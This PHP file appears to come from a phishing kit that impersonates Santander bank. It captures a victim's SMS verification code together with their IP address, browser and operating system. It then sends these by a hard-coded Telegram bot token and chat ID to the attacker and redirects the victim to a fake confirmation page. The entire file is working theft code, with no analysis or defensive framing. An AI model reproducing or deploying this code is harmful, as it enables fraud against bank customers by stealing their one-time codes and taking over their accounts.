﻿﻿<?php
$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

session_start();
include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
include("../SHkIllUA.php"); 

$msg="|+ SMS-2(SANTANDERBANk)\r\n";
$msg.="==================================================\r\n";
$msg.="[+] Sms 2 : {$_POST['SMSERROR']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$token = "1220651941:AAGYicj2By8ztSFgPSHZBD5qPKHOXnNvVvM";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=809875026&text=" . urlencode($msg)."" );

echo "<script type='text/javascript'>window.top.location='../../verificada.php';</script>"; exit

?>